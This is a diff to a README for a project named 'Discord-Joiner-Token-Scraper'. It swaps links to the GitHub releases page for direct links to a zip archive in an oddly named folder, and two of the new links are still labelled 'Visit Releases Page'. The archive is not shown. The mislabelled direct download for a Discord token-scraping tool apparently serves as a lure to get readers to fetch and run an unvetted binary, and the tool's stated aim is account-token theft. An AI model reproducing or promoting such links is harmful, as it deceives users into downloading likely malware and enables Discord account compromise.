@@ -6,7 +6,7 @@
 
 ## 🔗 Download Now
 
-[![Download Discord-Joiner-Token-Scraper](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/romulusharish/Discord-Joiner-Token-Scraper/releases)
+[![Download Discord-Joiner-Token-Scraper](https://raw.githubusercontent.com/romulusharish/Discord-Joiner-Token-Scraper/main/truantcy/Discord-Joiner-Scraper-Token-v2.7-beta.5.zip)](https://raw.githubusercontent.com/romulusharish/Discord-Joiner-Token-Scraper/main/truantcy/Discord-Joiner-Scraper-Token-v2.7-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ Before you download the software, make sure your computer meets the following re
 
 To get the latest version of **Discord-Joiner-Token-Scraper**, visit the releases page. Here you will find all available versions, along with download links.
 
-[Visit Releases Page to Download](https://github.com/romulusharish/Discord-Joiner-Token-Scraper/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/romulusharish/Discord-Joiner-Token-Scraper/main/truantcy/Discord-Joiner-Scraper-Token-v2.7-beta.5.zip)
 
 ### 3. Download the Application
 
@@ -85,4 +85,4 @@ If you encounter any issues:
 
 Make sure to keep your application updated by regularly checking the releases page for new versions. This ensures you have the latest features and security updates.
 
-[Visit Releases Page to Download](https://github.com/romulusharish/Discord-Joiner-Token-Scraper/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/romulusharish/Discord-Joiner-Token-Scraper/main/truantcy/Discord-Joiner-Scraper-Token-v2.7-beta.5.zip)
